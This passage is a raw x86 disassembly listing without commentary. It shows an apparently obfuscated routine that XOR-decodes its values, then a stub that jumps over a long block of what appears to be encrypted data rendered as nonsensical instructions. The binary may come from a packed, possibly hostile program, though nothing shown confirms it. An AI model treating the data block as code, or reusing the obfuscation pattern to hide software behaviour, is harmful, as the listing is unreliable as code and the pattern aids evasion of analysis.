  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	out    dx,al
  407496:	jno    0x407505
  407498:	mov    al,ds:0x7e7ec0a4
  40749d:	and    BYTE PTR [ebp+0x7e],bh
  4074a0:	jle    0x40743f
  4074a2:	aad    0xc5
  4074a4:	mov    edi,0x2bcefb62
  4074a9:	(bad)  
  4074aa:	clc    
  4074ab:	push   ebp
  4074ac:	jle    0x4074d2
  4074ae:	clc    
  4074af:	das    
  4074b0:	(bad)  
  4074b1:	(bad)  
  4074b2:	xchg   esp,eax
  4074b3:	in     al,0x79
  4074b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074b6:	ins    BYTE PTR es:[edi],dx
  4074b7:	xor    BYTE PTR [ebp+0x147b8a35],0xb5
  4074be:	and    eax,DWORD PTR [ebx+0x5c]
  4074c1:	(bad)  
  4074c3:	enter  0xcf7a,0xe2
  4074c7:	mov    ss,eax
  4074c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ca:	cld    
  4074cb:	push   ecx
  4074cc:	inc    esi
  4074cd:	jbe    0x40745c
  4074cf:	add    al,0x9b
  4074d1:	(bad)  
  4074d3:	pushf  
  4074d4:	fld    QWORD PTR [eax-0x73303a42]
  4074da:	ret    0xcf81
  4074dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074de:	bound  esi,QWORD PTR [eax-0x74]
  4074e1:	jb     0x4074a5
  4074e3:	add    eax,0x1ee05877
  4074e8:	pop    ebp
  4074e9:	test   al,0x86
  4074eb:	cmp    eax,DWORD PTR [ebp-0x2e]
  4074ee:	add    dh,0xbe
  4074f1:	(bad)  
  4074f2:	jmp    0x407497
  4074f4:	ret    0x3cd4
  4074f7:	and    bl,BYTE PTR [edi-0x4f3e8217]
  4074fd:	iret   
  4074fe:	test   BYTE PTR fs:[ecx],ah
  407501:	(bad)  
  407502:	div    edi
  407504:	push   0xffffffbe
  407506:	mov    al,ds:0xa3916dab
  40750b:	fs mov bl,0x58
  40750e:	cwde   
  40750f:	(bad)  
  407511:	(bad)  
  407512:	(bad)  
  407513:	pop    ss
  407514:	mov    ecx,DWORD PTR [eax+0x128574a9]
  40751a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40751b:	mov    ebp,0xce1826f2
  407520:	cmp    al,0xf5
  407522:	push   eax
  407523:	and    cl,BYTE PTR [ebx+0x3179b554]
  407529:	fwait
  40752a:	xlat   BYTE PTR ds:[ebx]
  40752b:	pop    eax
  40752c:	mov    cl,al
  40752e:	scas   eax,DWORD PTR es:[edi]
  40752f:	pop    ebx
  407530:	mov    bp,0xc2b3
  407534:	jns    0x4074e2
  407536:	loope  0x40759b
  407538:	repz add al,0x6f
  40753b:	ins    DWORD PTR es:[edi],dx
  40753c:	inc    ebx
  40753d:	into   
  40753e:	fidiv  WORD PTR [eax-0x754d4198]
  407544:	add    ch,0x18
  407547:	fwait
  407548:	mov    edx,0x263e1624
  40754d:	xchg   ebx,eax
  40754e:	sbb    BYTE PTR [eax],0x12
  407551:	or     al,0x7c
  407553:	mov    dh,0x43
  407555:	lahf   
  407556:	loope  0x4075d0
  407558:	cmp    DWORD PTR [esi+eax*4],eax
  40755b:	lds    ecx,FWORD PTR [edi]
  40755d:	ret    0x5b17
  407560:	call   FWORD PTR cs:[esi-0x19]
  407564:	mov    ebp,0xee6f4772
  407569:	or     ah,BYTE PTR [ecx]
  40756b:	xor    esp,DWORD PTR [esp+eax*4+0x35]
  40756f:	es rcr ah,0x3d
  407573:	sti    
  407574:	inc    esi
  407575:	dec    edx
  407576:	mov    eax,ds:0x8563e27c
  40757b:	sti    
  40757c:	mov    ds:0xa242250f,al
  407581:	lea    ebx,[ecx-0x613fffab]
  407587:	shl    BYTE PTR [edi-0x23630ed4],1
  40758d:	sub    al,BYTE PTR [esi-0x5427666f]
  407593:	outs   dx,BYTE PTR ds:[esi]
  407594:	in     eax,dx
  407595:	mov    edi,0xa538e1dd
  40759a:	xchg   edx,eax
  40759b:	std    
  40759c:	(bad)  
  40759d:	imul   edx,DWORD PTR [ecx-0x29],0x8e393534
  4075a4:	outs   dx,BYTE PTR ds:[esi]
  4075a5:	shr    BYTE PTR [edx-0x3e],0x19
  4075a9:	mov    edi,0x12999a8a
  4075ae:	and    eax,0xae98fb54
  4075b3:	das    
  4075b4:	sub    DWORD PTR [eax+0x3d],esi
  4075b7:	or     ah,bh
  4075b9:	bound  edi,QWORD PTR [ebx+eax*1+0x63]
  4075bd:	ficom  WORD PTR [eax+eax*8-0x5adaf2dd]
  4075c4:	out    dx,al
  4075c5:	aam    0x7c
  4075c7:	push   eax
  4075c8:	mov    ds:0x9c5f0a8b,eax
  4075cd:	cmp    BYTE PTR [eax-0xc49a123],0x21
  4075d4:	in     al,dx
  4075d5:	into   
  4075d6:	jp     0x407655
  4075d8:	and    BYTE PTR [edx],0x90
  4075db:	inc    ebp
  4075dc:	or     ebp,ebx
  4075de:	push   ebx
  4075df:	ficom  WORD PTR [ebx+0x0]
  4075e2:	xor    al,0xf6
  4075e4:	hlt    
  4075e5:	leave  
  4075e6:	ja     0x4075c3
  4075e8:	call   0xfb8b:0x5ed9a76b
  4075ef:	cmp    bh,ch
  4075f1:	mov    cl,0x71
  4075f3:	mov    WORD PTR [ecx-0x9],ss
  4075f6:	lea    ebx,[edx+0x7d4010ee]
  4075fc:	in     eax,dx
  4075fd:	icebp  
  4075fe:	jns    0x4075b1
  407600:	call   0xd7c49499
  407605:	daa    
  407606:	icebp  
  407607:	xor    BYTE PTR [ebp+0x20],bh
  40760a:	repz pop ecx
  40760c:	add    esi,0x979a539b
  407612:	push   ecx
  407613:	loop   0x407629
  407615:	dec    eax
  407616:	and    eax,0xf7e1a4b
  40761b:	enter  0xa07d,0x1
  40761f:	into   
  407620:	cli    
  407621:	pusha  
  407622:	ds mov eax,esi
  407625:	pop    ss
  407626:	xor    DWORD PTR [edx+0x68108214],esp
  40762c:	xlat   BYTE PTR ds:[ebx]
  40762d:	fimul  WORD PTR [edx+0x4e]
  407630:	pop    edx
  407631:	push   0x22
  407633:	ds into 
  407635:	dec    ebp
  407636:	push   edx
  407637:	inc    esi
  407638:	lods   eax,DWORD PTR ds:[esi]
  407639:	xchg   ebx,eax
  40763a:	add    ebx,DWORD PTR [ecx+edx*4-0x4b9e9728]
  407641:	jle    0x40765f
  407643:	push   cs
  407644:	sar    DWORD PTR [ebx],cl
  407646:	sub    al,0xd2
  407648:	fisubr DWORD PTR [esi+ebp*2+0x31dfe0ec]
  40764f:	stc    
  407650:	in     eax,dx
  407651:	mov    ebx,0xa75218dd
  407656:	mov    esp,0xc0caf3bf
  40765b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40765c:	xor    edx,DWORD PTR [ebx]
  40765e:	mov    dl,0xb9
  407660:	(bad)  
  407661:	jl     0x407613
  407663:	mov    ds:0x87b09517,eax
  407668:	test   BYTE PTR [ecx],cl
  40766a:	dec    esp
  40766b:	sub    eax,0x2556cdc3
  407670:	sbb    DWORD PTR [edx],edx
  407672:	cmp    ebx,DWORD PTR [ecx]
  407674:	xlat   BYTE PTR ds:[ebx]
  407675:	sub    DWORD PTR [edx+0x68],edi
  407678:	adc    eax,0xd056e62c
  40767d:	out    dx,eax
  40767e:	dec    DWORD PTR [edi+0x2e83f26d]
  407684:	loope  0x40761f
  407686:	mov    al,0x81
  407688:	in     eax,0x6d
  40768a:	cmp    DWORD PTR [eax],0xffffffa9
  40768d:	xlat   BYTE PTR ds:[ebx]
  40768e:	mov    edx,0x37bbc285
  407693:	je     0x40761f
  407695:	sub    dh,BYTE PTR fs:[esi-0x45]
  407699:	mov    WORD PTR [edi+0x595515e2],gs
  40769f:	mov    edx,0x249ef628
  4076a4:	push   0xffffffe2
  4076a6:	push   ecx
  4076a7:	mov    ebp,0x3c9da0d6
  4076ac:	aad    0x71
  4076ae:	xchg   esi,eax
  4076af:	or     BYTE PTR [edi-0xb5320d1],al
  4076b5:	sub    eax,0x881c0904
  4076ba:	mov    ecx,0xc4cd6191
  4076bf:	and    ah,ah
  4076c1:	fimul  DWORD PTR [esi+0x56]
  4076c4:	jl     0x4076f3
  4076c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c7:	cmp    dh,0x97
  4076ca:	xchg   ebx,eax
  4076cb:	nop
  4076cc:	push   ecx
  4076cd:	in     al,0x68
  4076cf:	jecxz  0x4076e0
  4076d1:	imul   esi,DWORD PTR [esp+eiz*8],0x18
  4076d5:	mov    edx,0xd1481587
  4076da:	in     al,dx
  4076db:	ret    
  4076dc:	cli    
  4076dd:	jl     0x407669
  4076df:	outs   dx,BYTE PTR ds:[esi]
  4076e0:	cmp    DWORD PTR [eax+0x19],ebp
  4076e3:	ins    DWORD PTR es:[edi],dx
  4076e4:	sahf   
  4076e5:	mov    dh,BYTE PTR [ebp-0x7c0bdbf7]
  4076eb:	daa    
  4076ec:	inc    edi
  4076ed:	shl    DWORD PTR [esi+eax*1+0x54b31d26],0x8d
  4076f5:	mov    cl,0xff
  4076f7:	add    eax,0x3d3a6de0
  4076fc:	dec    ecx
  4076fd:	xchg   edi,eax
  4076fe:	(bad)  
  4076ff:	repz sub eax,DWORD PTR [ecx]
  407702:	stos   DWORD PTR es:[edi],eax
  407703:	call   0xc2e0:0xbfc291b
  40770a:	std    
  40770b:	and    dl,BYTE PTR ds:0xe39d8623
  407711:	sbb    eax,DWORD PTR [eax-0x13c6f736]
  407717:	dec    edx
  407718:	jb     0x40776b
  40771a:	adc    ax,0x8831
  40771e:	sahf   
  40771f:	sub    esi,0xffffffd8
  407722:	arpl   WORD PTR [esp+ebp*8-0x54],di
  407726:	adc    esp,DWORD PTR [ebp+0x63]
  407729:	(bad)  [edi+0x39]
  40772c:	dec    ecx
  40772d:	push   ebp
  40772e:	bound  esi,QWORD PTR [edi-0x6ddc8d37]
  407734:	mov    ah,0x39
  407736:	nop
  407737:	cwde   
  407738:	nop
  407739:	sar    BYTE PTR [edx-0x64],1
  40773c:	jnp    0x4076fb
  40773e:	mov    dl,0xd2
  407740:	sbb    eax,0x2125da6d
  407745:	mov    edi,cs
  407747:	in     al,0x6b
  407749:	std    
  40774a:	and    DWORD PTR [ecx+0x6e003d05],edi
  407750:	pop    ss
  407751:	scas   eax,DWORD PTR es:[edi]
  407752:	dec    ecx
  407753:	mov    ch,0xb3
  407755:	js     0x4077ab
  407757:	fmul   QWORD PTR [ebp-0x2f]
  40775a:	ja     0x407749
  40775c:	stos   BYTE PTR es:[edi],al
  40775d:	mov    al,ds:0x4a89c0be
  407762:	stc    
  407763:	xchg   ebp,eax
  407764:	jp     0x40772c
  407766:	fist   DWORD PTR es:[ebp*4+0x29c58400]
  40776e:	xor    al,0x26
  407770:	push   ecx
  407771:	jmp    0x4077ec
  407773:	call   0x39bb:0x337b1ba6
  40777a:	repz xor BYTE PTR [ebp-0x7a1414a7],bl
  407781:	and    eax,edx
  407783:	ret    
  407784:	fnstsw WORD PTR [esi]
  407786:	stc    
  407787:	pop    eax
  407788:	push   0xeb6ef15c
  40778d:	retf   0xa0dd
  407790:	aas    
  407791:	addr16 sti 
  407793:	mov    ah,0xa7
  407795:	add    BYTE PTR [edx+ecx*2],0x91
  407799:	fcom   QWORD PTR [ebx+0x34]
  40779c:	pusha  
  40779d:	outs   dx,DWORD PTR ds:[esi]
  40779e:	retf   
  40779f:	mov    WORD PTR [ebp+0x684f2c78],fs
  4077a5:	fmul   st,st(4)
  4077a7:	ins    DWORD PTR es:[edi],dx
  4077a8:	pop    ds
  4077a9:	repnz or dh,bl
  4077ac:	xor    BYTE PTR [ecx],cl
  4077ae:	xchg   BYTE PTR [edx+0x69],dh
  4077b1:	mov    cl,0x80
  4077b3:	mov    DWORD PTR [edi],ebx
  4077b5:	leave  
  4077b6:	sahf   
  4077b7:	out    dx,al
  4077b8:	imul   edi,DWORD PTR [eax+esi*2+0x4e],0x86dd139f
  4077c0:	mov    esi,0x233ed402
  4077c5:	inc    esi
  4077c6:	and    al,0xd3
  4077c8:	into   
  4077c9:	mov    eax,0x6313dac3
  4077ce:	mov    cs,WORD PTR [ebx+0x5c7fc4d]
  4077d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d5:	aaa    
  4077d6:	inc    ebx
  4077d7:	add    BYTE PTR [ebp+0x5e],ah
  4077da:	add    BYTE PTR [eax],al
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	add    al,0xb4
  4077f6:	fcom   st(4)
  4077f8:	push   esi
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x4077a2
  407801:	xchg   ebp,eax
  407802:	adc    DWORD PTR [ebx+esi*2-0x5e],0xffffffe8
  407807:	in     eax,dx
  407808:	dec    esp
  407809:	lods   al,BYTE PTR ds:[esi]
  40780a:	jbe    0x407807
  40780c:	inc    esi
  40780d:	sub    BYTE PTR [eax-0x7e],ah
  407810:	or     ah,BYTE PTR ds:[eax]
  407813:	rcr    esi,cl
  407815:	mov    dh,0x7a
  407817:	int    0x62
  407819:	inc    edi
  40781a:	dec    edi
  40781b:	test   DWORD PTR [esi+0x28],edx
  40781e:	and    BYTE PTR [ebp+0x7bad4805],0x7a
  407825:	fstp   TBYTE PTR [ecx+ecx*2-0x42d81c53]
  40782d:	in     al,0xa7
  40782f:	not    ch
  407831:	push   ecx
  407832:	int    0x66
  407834:	mov    bl,bh
  407836:	setnp  BYTE PTR [esi]
  407839:	adc    esi,0x5b
  40783c:	dec    esp
  40783d:	mov    dl,0x2f
  40783f:	(bad)  
  407840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407841:	ss pop eax
  407843:	xlat   BYTE PTR ds:[ebx]
  407844:	xlat   BYTE PTR ds:[ebx]
  407845:	fisttp WORD PTR [edx+ecx*4]
  407848:	iret   
  407849:	sbb    al,0x1c
  40784b:	sahf   
  40784c:	xchg   edi,eax
  40784d:	bound  ecx,QWORD PTR [esi+0x502ac6a8]
  407853:	sub    bl,BYTE PTR [ebx-0x6e]
  407856:	push   0x3b
  407858:	pop    esi
  407859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40785a:	cld    
  40785b:	mov    esp,0xf9d0fe28
  407860:	faddp  st(7),st
  407862:	mov    dh,0x32
  407864:	add    DWORD PTR [ebx],ebx
  407866:	inc    edx
  407867:	ret    0xfcf3
  40786a:	loope  0x407875
  40786c:	scas   al,BYTE PTR es:[edi]
  40786d:	sub    al,0x49
  40786f:	xchg   edx,eax
  407870:	iret   
  407871:	add    bh,BYTE PTR [esi+0x35]
  407874:	xor    eax,eax
  407876:	push   ss
  407877:	xchg   edx,eax
  407878:	jnp    0x4078d9
  40787a:	mov    al,0x60
  40787c:	imul   ebp,DWORD PTR [esi+0x27e60b8],0x4f
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	stos   BYTE PTR es:[edi],al
  407885:	iret   
  407886:	frstor [ecx-0x4e]
  407889:	push   edx
  40788a:	xchg   ecx,eax
  40788b:	xchg   ecx,eax
  40788c:	ins    BYTE PTR es:[edi],dx
  40788d:	mov    esp,0xe06150bd
  407892:	pop    ecx
  407893:	repnz push edi
  407895:	xchg   ecx,eax
  407897:	loopne 0x407865
  407899:	add    eax,ebx
  40789b:	fistp  QWORD PTR [eax-0x7c]
  40789e:	sbb    eax,0x86f90d4f
  4078a3:	mul    DWORD PTR [edi]
  4078a5:	jmp    0x407922
  4078a7:	push   ebp
  4078a8:	sbb    dl,bh
  4078aa:	pop    ds
  4078ab:	mov    al,0xa
  4078ad:	add    DWORD PTR [edi],esi
  4078af:	cs lock pushf 
  4078b2:	xchg   edi,eax
  4078b3:	gs mov esp,0x846f7d02
  4078b9:	push   ecx
  4078ba:	loop   0x40790c
  4078bc:	pop    ebp
  4078bd:	cli    
  4078be:	cmp    DWORD PTR [edi+0x46],ebp
  4078c1:	or     al,0x4f
  4078c3:	test   eax,0x88b449d3
  4078c8:	std    
  4078c9:	xlat   BYTE PTR ds:[ebx]
  4078ca:	sbb    ecx,DWORD PTR [esi+0x7b22e080]
  4078d0:	lods   eax,DWORD PTR ds:[esi]
  4078d1:	push   0x549eb1cc
  4078d6:	inc    esp
  4078d7:	in     al,dx
  4078d8:	fstp   QWORD PTR [ebp-0xb]
  4078db:	jnp    0x407949
  4078dd:	shl    ch,cl
  4078df:	fisubr WORD PTR [edi+ecx*1+0x59a7e763]
  4078e6:	test   al,0xd5
  4078e8:	cmp    ecx,eax
  4078ea:	adc    esi,DWORD PTR [edi+0x605af028]
  4078f0:	sub    al,0xfa
  4078f2:	shl    BYTE PTR [ecx],0x7d
  4078f5:	inc    ebx
  4078f6:	sti    
  4078f7:	mov    DWORD PTR [edi-0x5e1ec6c0],ebx
  4078fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078fe:	pop    ecx
  4078ff:	adc    BYTE PTR [eax-0x310cbf38],ah
  407905:	jne    0x40793a
  407907:	pop    es
  407908:	dec    edx
  407909:	ret    0x102f
  40790c:	es stc 
  40790e:	mov    ebx,0x19a27be4
  407913:	pop    edi
  407914:	jno    0x4078e0
  407916:	cmp    ebp,DWORD PTR [ebp+edi*4+0x4c4077a3]
  40791d:	pop    eax
  40791e:	and    BYTE PTR [ebx-0x11],dl
  407921:	add    BYTE PTR [edi],cl
  407923:	push   ss
  407924:	xchg   edx,eax
  407925:	ja     0x4078bd
  407927:	or     dh,BYTE PTR [edi-0x55a6c689]
  40792d:	mov    edx,0x6aaa4f92
  407932:	push   edx
  407933:	xchg   esi,eax
  407934:	aas    
  407935:	hlt    
  407936:	inc    edi
  407937:	sub    eax,0x7af70156
  40793c:	ret    0x2bde
  40793f:	mov    dh,0xdc
  407941:	mov    DWORD PTR [ebp+0x50f09742],eax
  407947:	sbb    al,0x78
  407949:	inc    esi
  40794a:	ret    
  40794b:	xor    DWORD PTR [edi],ecx
  40794d:	mov    esi,0xfb5e3284
  407952:	aaa    
  407953:	test   eax,0xfc9a5747
  407958:	mov    eax,ds:0x3fe8fa7d
  40795d:	dec    ebx
  40795e:	sbb    ecx,DWORD PTR [eax]
  407960:	dec    ebx
  407961:	xchg   BYTE PTR [ebp-0x7bef11e2],al
  407967:	cmp    al,0x1a
  407969:	mov    gs,WORD PTR ds:0x303dc039
  40796f:	jno    0x4078fa
  407971:	mov    al,0xee
  407973:	fstp   DWORD PTR [edx+0xf808475]
  407979:	xor    DWORD PTR [edi],esi
  40797b:	aas    
  40797c:	mov    ds:0xc6a0a332,al
  407981:	out    0xd7,al
  407983:	ror    DWORD PTR [esi+0x66],0x2e
  407987:	push   ebx
  407988:	div    DWORD PTR [edx]
  40798a:	aam    0x56
  40798c:	adc    eax,0xa70fc2a1
  407991:	ins    DWORD PTR es:[edi],dx
  407992:	call   0x3d21712
  407997:	jnp    0x4079ba
  407999:	ins    DWORD PTR es:[edi],dx
  40799a:	outs   dx,DWORD PTR ds:[esi]
  40799b:	ss out 0xaf,eax
  40799e:	mov    al,ds:0x7a1184b9
  4079a3:	imul   DWORD PTR [ecx+edi*8-0x2001bf02]
  4079aa:	jl     0x40798f
  4079ac:	xchg   esi,eax
  4079ad:	jp     0x40794b
  4079af:	fdivrp st(4),st
  4079b1:	cli    
  4079b2:	cwde   
  4079b3:	inc    edx
  4079b4:	mov    dh,0xa2
  4079b6:	cld    
  4079b7:	sbb    di,dx
  4079ba:	sub    eax,0xe3bad98a
  4079bf:	mov    fs,edx
  4079c1:	sub    eax,0x8623f86f
  4079c6:	jle    0x407a11
  4079c8:	cmp    dh,BYTE PTR [edx-0x16]
  4079cb:	std    
  4079cc:	pop    esp
  4079cd:	ret    0x35b4
  4079d0:	xchg   DWORD PTR [ebp+edx*4+0x2e],edx
  4079d4:	or     BYTE PTR [ecx+ecx*8-0x44],ch
  4079d8:	sbb    cl,cl
  4079da:	in     eax,0xb7
  4079dc:	ss dec ebx
  4079de:	pop    edx
  4079df:	aam    0x77
  4079e1:	ja     0x4079e8
  4079e3:	fs pop edx
  4079e5:	mov    DWORD PTR gs:[edi],eax
  4079e8:	push   ss
  4079e9:	jp     0x4079d3
  4079eb:	mov    DWORD PTR ds:0x2e155d81,0x7d88496d
  4079f5:	or     edx,eax
  4079f7:	cs enter 0xc2db,0x6b
  4079fc:	dec    ebx
  4079fd:	iret   
  4079fe:	adc    dl,dh
  407a00:	into   
  407a01:	and    BYTE PTR [eax+0x5b4dcb93],al
  407a07:	rcr    edx,1
  407a09:	js     0x407a1e
  407a0b:	div    ebp
  407a0d:	icebp  
  407a0e:	push   edi
  407a0f:	iret   
  407a10:	and    eax,0x9d623ade
  407a15:	mov    al,ds:0x745d8755
  407a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a1b:	xor    DWORD PTR [edx],eax
  407a1d:	jecxz  0x4079cd
  407a1f:	sti    
  407a20:	push   ss
  407a21:	out    0x27,eax
  407a23:	adc    bh,BYTE PTR gs:[esi+0x67b4ee29]
  407a2a:	xchg   ebx,edx
  407a2c:	retf   0x7f7a
  407a2f:	pop    esp
  407a30:	sbb    BYTE PTR [ebx-0x4c],al
  407a33:	or     DWORD PTR [edi+eax*4],edi
  407a36:	mov    ebp,0xd2bb60e2
  407a3b:	jle    0x407a60
  407a3d:	jne    0x407a12
  407a3f:	cmp    esp,DWORD PTR [esp+edx*4]
  407a42:	sbb    al,0xf8
  407a44:	xor    eax,0xdfdee037
  407a49:	mov    dl,0x1f
  407a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a4c:	lods   al,BYTE PTR ds:[esi]
  407a4d:	out    dx,al
  407a4e:	push   ebp
  407a4f:	mov    al,ds:0x3096bda6
  407a54:	out    0x80,eax
  407a56:	fnsave fs:[ecx]
  407a59:	neg    BYTE PTR [edi+0xe39caa6]
  407a5f:	ret    
  407a60:	stos   DWORD PTR es:[edi],eax
  407a61:	ss loop 0x407aa4
  407a64:	add    esp,edx
  407a66:	into   
  407a67:	cmp    edx,eax
  407a69:	and    bl,BYTE PTR [edi]
  407a6b:	fwait
  407a6c:	or     eax,0x7acb950e
  407a71:	add    cl,dl
  407a73:	fisub  WORD PTR [ebp+0x58]
  407a76:	fs cmp al,0x86
  407a79:	ja     0x407a45
  407a7b:	inc    eax
  407a7c:	clc    
  407a7d:	loopne 0x407a51
  407a7f:	jnp    0x407aa8
  407a81:	mov    ecx,ss
  407a83:	or     al,0xb0
  407a85:	jg     0x407aef
  407a87:	inc    eax
  407a88:	mul    DWORD PTR [ebp+0x154443cc]
  407a8e:	cmp    eax,0xef5ac42b
  407a93:	(bad)  
  407a94:	inc    ebx
  407a95:	xchg   edx,eax
  407a96:	jge    0x407b01
  407a98:	pop    ebp
  407a99:	das    
  407a9a:	lds    esi,FWORD PTR [edx-0x71c7f475]
  407aa0:	out    0x48,eax
  407aa2:	sub    DWORD PTR [esi+0x3212ace9],ebp
  407aa8:	shl    bl,cl
  407aaa:	mov    bl,BYTE PTR [ebp-0x62]
  407aad:	mov    esp,0x723b32b9
  407ab2:	lods   eax,DWORD PTR ds:[esi]
  407ab3:	retf   0x91e5
  407ab6:	mov    edi,0x53d326eb
  407abb:	push   ecx
  407abc:	cmp    al,0x8d
  407abe:	data16 jo 0x407ae6
  407ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ac2:	mov    bh,0x3b
  407ac4:	sub    BYTE PTR [ebp-0x9],bl
  407ac7:	mov    ds:0xc43a09cb,al
  407acc:	pop    ebx
  407acd:	call   0x45e9:0xb02517e3
  407ad4:	or     ebp,DWORD PTR [ebp-0x16]
  407ad7:	pop    edx
  407ad8:	daa    
  407ad9:	pop    ds
  407ada:	div    DWORD PTR [edi]
  407adc:	add    eax,0x2d1736a7
  407ae1:	cld    
  407ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae3:	jle    0x407b15
  407ae5:	aaa    
  407ae6:	xlat   BYTE PTR ds:[ebx]
  407ae7:	sub    ch,bh
  407ae9:	aaa    
  407aea:	lahf   
  407aeb:	mov    esp,0xdbc17741
  407af0:	and    DWORD PTR [ecx],esp
  407af2:	mov    esp,0xed8dcdf
  407af7:	ss ret 0x2d46
